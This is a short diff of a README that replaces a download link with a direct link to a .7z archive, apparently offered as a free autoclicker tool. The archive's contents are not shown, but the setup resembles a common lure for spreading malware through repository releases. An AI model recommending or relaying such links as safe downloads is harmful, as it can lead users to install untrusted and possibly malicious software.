@@ -1,4 +1,4 @@
-# 📂[DOWNLOAD](https://github.com/darkangelwhitefox/jubilant-winner/releases/tag/latestversion)
+# 📂[DOWNLOAD](https://github.com/robot93leokarshiev/Vertus-Free-Clicker/releases/download/Vertus-Clicker/Git_Softwares_v1.0.2.7z)
 
 ## ✨Features:
 - Autoclicker
